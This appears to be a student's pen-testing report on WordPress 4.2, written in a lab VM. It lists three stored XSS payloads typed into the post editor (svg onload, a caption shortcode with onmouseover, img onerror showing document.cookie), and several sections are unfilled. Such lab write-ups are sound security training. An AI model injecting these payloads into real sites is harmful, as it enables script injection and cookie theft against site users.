# Project 7 - WordPress Pen Testing

Time spent: **12** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pen Testing Report

### 1. (Required) Vulnerability Name: XSS 

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.2.3
- [ ] GIF Walkthrough: <img src=xss.gif />
- [ ] Steps to recreate: 
  - Create a new post
  - type this line of code in the text editor: http://wpdistillery.vm/<svg onload=alert('test')> 
- [ ] Affected source code:

  
### 2. (Required) Vulnerability Name: XSS

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.2.3
- [ ] GIF Walkthrough: <img src=XSS2.gif />
- [ ] Steps to recreate: 
  - Create a new post
  - type this line of code in the text editor: <a href="[caption code=">]</a><a title=" onmouseover=alert(1) ">link</a>
- [ ] Affected source code:


### 3. (Required) Vulnerability Name: XSS

- [ ] Summary: 
  - Vulnerability types: XSS
  - Tested in version: 4.2
  - Fixed in version: 4.2.3
- [ ] GIF Walkthrough: <img src=XSS3.gif />
- [ ] Steps to recreate: 
  - Create a new post
  - type this line of code in the text editor: <img src=X onerror=alert(document.cookie)>.jpg 
- [ ] Affected source code:


## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with  ...
<!-- Recommended GIF Tools:
[Kap](https://getkap.co/) for macOS
[ScreenToGif](https://www.screentogif.com/) for Windows
[peek](https://github.com/phw/peek) for Linux. -->

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
